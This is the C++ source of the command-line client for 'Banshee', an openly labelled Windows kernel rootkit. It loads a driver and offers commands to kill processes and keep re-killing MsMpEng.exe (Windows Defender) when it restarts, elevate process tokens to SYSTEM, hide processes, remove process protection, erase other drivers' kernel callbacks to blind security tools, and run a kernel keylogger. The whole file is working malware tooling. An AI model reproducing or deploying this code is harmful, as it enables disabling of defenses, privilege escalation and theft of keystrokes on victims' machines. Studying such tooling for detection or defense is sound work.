// Banshee.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "Banshee.hpp"
#include "Logger.hpp"
#include <iostream>
#include <string.h>

// cursed macro
#define echo std::cout <<

INT 
main(INT argc, CHAR *argv[])
{
    echo " ______   ______   ______   ______   _    _   ______  ______ \n";
    echo "| |  | \\ | |  | | | |  \\ \\ / |      | |  | | | |     | |     \n";
    echo "| |--| < | |__| | | |  | | '------. | |--| | | |---- | |---- \n";
    echo "|_|__|_/ |_|  |_| |_|  |_|  ____|_/ |_|  |_| |_|____ |_|____ \n\n";
    std::cout << "Banshee Rootkit v0.0.9\n" << std::endl;

    auto banshee = Banshee();

    if (argc >= 2)
    {
        std::string driverPath = argv[1];
        BANSHEE_STATUS BeStatus = banshee.Install(driverPath);

        LogInfo("Installing driver if not already installed...");
        if (BeStatus != BE_SUCCESS)
        {
            if (BeStatus == BE_ERR_DRIVER_NOT_EXISTS)
            {
                LogError("Driver does not exist at path " + driverPath + " ");
            }
            else
            {
                LogError("Error during install");
            }
            return 1;
        }
        LogInfo("Loading driver...");
        if (banshee.Initialize() != BE_SUCCESS)
        {
            LogError("Error during initialization");
            return 2;
        }
    }
    else
    {
        LogInfo("Driver location not specified. Assuming driver is loaded already...");
        if (!banshee.InitDriverHandle())
        {
            LogError("Error during initialization: Could not get handle");
            return 3;
        }
    }
    
    // Main Loop

    BOOL shouldExit = false;
    while (!shouldExit)
    {
        BANSHEE_STATUS status = BE_ERR_GENERIC;

        auto choice = AskInput("");
        auto end_pos = std::remove(choice.begin(), choice.end(), ' '); // strip spaces from commands
        choice.erase(end_pos, choice.end());

        if (choice == "help")
        {
            printf("Kill:\n");
            printf("    kill      - kill process by PID\n");
            printf("    bury      - Create callback to kill process when it comes back up. Defaults to MsMpEng.exe\n");
            printf("Process:\n");
            printf("    elevate   - Change a process access token to SYSTEM by PID\n");
            printf("    hide      - Hide a process from task manager etc. by PID\n");
            printf("    unprotect - remove protection from process by PID\n");
            printf("    protect   - apply PS_PROTECTED_SYSTEM protection to process by PID\n");
            printf("Callbacks:\n");
            printf("    callbacks - enumerate kernel callbacks\n");
            printf("    erase     - erase kernel callbacks of any driver\n");
            printf("Driver:\n");
            printf("    test      - test driver\n");
            printf("    load      - load driver from path\n");
            printf("    unload    - unload driver\n");
            printf("Misc:\n");
            printf("    keylog         - start keylogger\n");
            printf("    stop_keylog    - stop keylogger\n");
            printf("\n");
            printf("    exit      - exit banshee\n");
            continue;
        }
        else if (choice == "exit")
        {
            shouldExit = true;
            continue;
        }
        else if (choice == "test")
        {
            status = banshee.IoCtlTestDriver();
        }
        else if (choice == "load")
        {
            auto pathToDriver = AskInputNoPrompt("Path to driver: ");
            status = banshee.Install(pathToDriver);
            if (status == BE_SUCCESS)
            {
                status = banshee.Initialize();
            }
        }
        else if (choice == "unload")
        {
            status = banshee.Unload();
        }
        else if (choice == "kill")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlKillProcess(targetPid);
        }
        else if (choice == "bury")
        {
            auto processToBury = AskInputNoPrompt("Target process (substring to match image path, spaces will be stripped): ");

            // strip spaces
            auto end_pos = std::remove(processToBury.begin(), processToBury.end(), ' '); 
            processToBury.erase(end_pos, processToBury.end());

            LogInfo("Attempting to bury " + processToBury);
            status = banshee.IoCtlBuryProcess(processToBury);
        }
        else if (choice == "elevate")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlElevateProcessAccessToken(targetPid);
        }
        else if (choice == "hide")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlHideProcess(targetPid);
        }
        else if (choice == "unprotect")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_NONE);
        }
        else if (choice == "protect")
        {
            INT targetPid = getIntFromUser("Target pid: ");
            status = banshee.IoCtlProtectProcess(targetPid, PS_PROTECTED_SYSTEM);
        }
        else if (choice == "callbacks")
        {
            // Process callbacks
            auto processCallbackData = std::vector<CALLBACK_DATA>();
            status = banshee.IoCtlEnumerateCallbacks(CreateProcessNotifyRoutine, processCallbackData);
            if (status != BE_SUCCESS)
            {
                LogError("Banshee Error when enumerating process creation callbacks: " + std::to_string((INT)status));
                continue;
            }
            else
            {
                LogInfo("Enumerating process creation callbacks");
                for (auto e : processCallbackData)
                {
                    printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
                }
            }
            
            // Thread callbacks
            auto threadCallbackData = std::vector<CALLBACK_DATA>();
            status = banshee.IoCtlEnumerateCallbacks(CreateThreadNotifyRoutine, threadCallbackData);
            if (status != BE_SUCCESS)
            {
                LogError("Banshee Error when enumerating thread creation callbacks: " + std::to_string((INT)status));
                continue;
            }
            else
            {
                LogInfo("Enumerating thread creation callbacks");
                for (auto e : threadCallbackData)
                {
                    printf(":: 0x%llx+0x%llx (%ws)\n", e.driverBase, e.offset, e.driverName);
                }
            }
        }
        else if (choice == "erase")
        {
            auto targetDriver = AskInputNoPrompt("Target driver module (as printed in callback enumeration): ");

            // strip spaces
            auto end_pos = std::remove(targetDriver.begin(), targetDriver.end(), ' ');
            targetDriver.erase(end_pos, targetDriver.end());

            LogInfo("Attempting to erase callbacks of " + targetDriver);
            status = banshee.IoCtlEraseCallbacks(targetDriver);
        }
        else if (choice == "keylog")
        {
            LogInfo("Starting keylogger");
            status = banshee.IoCtlStartKeylogger(TRUE);
        }
        else if (choice == "stop_keylog")
        {
            LogInfo("Stopping keylogger");
            status = banshee.IoCtlStartKeylogger(FALSE);
        }
        else
        {
            LogError("Invalid choice: " + choice);
            continue;
        }

        if (status != BE_SUCCESS)
        {
            LogError("Banshee Error: " + std::to_string((int)status));
        }
        else
        {
            LogInfo("BE_SUCCESS");
        }
    }

    return 0;
}


